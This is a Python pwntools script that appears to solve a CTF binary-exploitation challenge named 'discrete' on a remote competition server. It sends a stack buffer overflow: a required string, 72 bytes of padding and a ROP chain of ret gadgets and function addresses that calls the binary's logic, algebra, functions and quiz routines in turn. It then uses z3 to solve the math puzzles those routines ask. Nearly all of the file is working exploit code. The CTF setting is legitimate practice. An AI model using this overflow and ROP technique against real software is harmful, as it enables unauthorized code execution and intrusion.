from pwn import *
from z3 import *

elf = ELF('./discrete')
# p = process(elf.path)
# p = gdb.debug(elf.path, '''
# b *main+301
# c
# ''')
p = remote('bin.bcactf.com', 49160)

required_string = b'i will get an A\x00'
OFFSET = 72 - len(required_string)

print(p.clean())
payload = required_string + b'A' * OFFSET 

payload += p64(0x401335) # ret
payload += p64(elf.symbols['logic'])
payload += p64(0x401335) # ret
payload += p64(elf.symbols['algebra'])
payload += p64(0x401335) # ret
payload += p64(elf.symbols['functions'])
payload += p64(0x401335) # ret
payload += p64(elf.symbols['quiz'])
p.sendline(payload)


def logic():
	sol = Solver()

	p, q, r, s = Bool('p'), Bool('q'), Bool('r'), Bool('s')
	sol.add(And(Or(p, q, Not(r)), Or(Not(p), r, Not(s)), q != s, s) == True)
	if sol.check() == sat:
		m = sol.model()
		mapper = {'false': 0, 'true': 1}
		def to_int(v):
			return mapper[v]

		return f'{to_int(m[p].sexpr())} {to_int(m[q].sexpr())} {to_int(m[r].sexpr())} {to_int(m[s].sexpr())}'

def algebra():
	sol = Solver()
	x,y,z = Int('x'), Int('y'), Int('z')

	sol.add(5*x - 6*y + 3*z == 153)
	sol.add(2*x + 5*y - 7*z == -163)
	sol.add(4*x + 8*y + 8*z == -28)

	if sol.check() == sat:
		m = sol.model()

		return f'{m[x].as_long()} {m[y].as_long()} {m[z].as_long()}'

def functions():
	sol = Solver()
	a,b,c = Reals('a b c')

	vertex_x = -b / (2*a)
	vertex_y = (a * (vertex_x * vertex_x)) + (b * vertex_x) + c
	discriminant = (b * b) - (4 * a * c)
	sol.add((vertex_x == 2), (vertex_y == -2), (discriminant == 16))
	sol.add(a != 0)

	if sol.check() == sat:
		m = sol.model()

		return f'{m[a].as_long()} {m[b].as_long()} {m[c].as_long()}'

p.sendline(logic())
p.sendline(algebra())
p.sendline(functions())

p.interactive()

